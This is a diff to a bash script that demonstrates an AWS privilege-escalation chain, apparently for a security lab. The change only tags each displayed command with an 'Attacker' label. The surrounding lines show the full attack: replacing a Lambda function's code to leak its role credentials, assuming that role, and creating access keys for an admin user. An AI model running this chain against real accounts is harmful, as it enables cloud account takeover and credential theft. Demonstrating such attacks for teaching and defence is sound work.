@@ -25,12 +25,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -98,7 +100,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -110,7 +112,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -118,7 +120,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}Warning: Unexpectedly have admin permissions already${NC}"
 else
@@ -246,7 +248,7 @@ echo "Function: $TARGET_LAMBDA"
 echo ""
 echo "Executing: aws lambda update-function-code --function-name $TARGET_LAMBDA"
 
-show_attack_cmd aws lambda update-function-code --region $AWS_REGION --function-name $TARGET_LAMBDA --zip-file fileb:///tmp/lambda_function.zip --output json
+show_attack_cmd "Attacker" "aws lambda update-function-code --region $AWS_REGION --function-name $TARGET_LAMBDA --zip-file fileb:///tmp/lambda_function.zip --output json"
 UPDATE_RESULT=$(aws lambda update-function-code \
     --region $AWS_REGION \
     --function-name $TARGET_LAMBDA \
@@ -281,7 +283,7 @@ echo "The malicious code will return the role's temporary credentials."
 echo ""
 echo "Executing: aws lambda invoke --function-name $TARGET_LAMBDA"
 
-show_attack_cmd aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/response.json --output json
+show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/response.json --output json"
 aws lambda invoke \
     --region $AWS_REGION \
     --function-name $TARGET_LAMBDA \
@@ -338,7 +340,7 @@ export AWS_SESSION_TOKEN=$LAMBDA_SESSION_TOKEN
 export AWS_REGION=$AWS_REGION
 
 # Verify we're now the Lambda role
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 LAMBDA_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $LAMBDA_IDENTITY"
 
@@ -352,7 +354,7 @@ echo -e "${GREEN}✓ Now using Lambda execution role credentials${NC}\n"
 echo -e "${YELLOW}Step 15: Verifying Lambda role permissions${NC}"
 echo "The Lambda role should have iam:CreateAccessKey permission..."
 echo "Attempting to list IAM users (may or may not be allowed)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${YELLOW}Lambda role can list IAM users${NC}"
 else
@@ -395,7 +397,7 @@ echo "Executing: aws iam create-access-key --user-name $ADMIN_USER"
 
 # Temporarily disable set -e to capture the error properly
 set +e
-show_attack_cmd aws iam create-access-key --user-name $ADMIN_USER --output json
+show_attack_cmd "Attacker" "aws iam create-access-key --user-name $ADMIN_USER --output json"
 KEY_OUTPUT=$(aws iam create-access-key --user-name $ADMIN_USER --output json 2>&1)
 KEY_EXIT_CODE=$?
 
@@ -435,7 +437,7 @@ export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_KEY
 export AWS_REGION=$AWS_REGION
 
 # Verify admin identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $ADMIN_IDENTITY"
 
@@ -450,7 +452,7 @@ echo -e "${YELLOW}Step 19: Verifying administrator access${NC}"
 echo "Attempting to list IAM users with admin credentials..."
 echo ""
 
-show_cmd aws iam list-users --max-items 3 --output table
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo ""
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
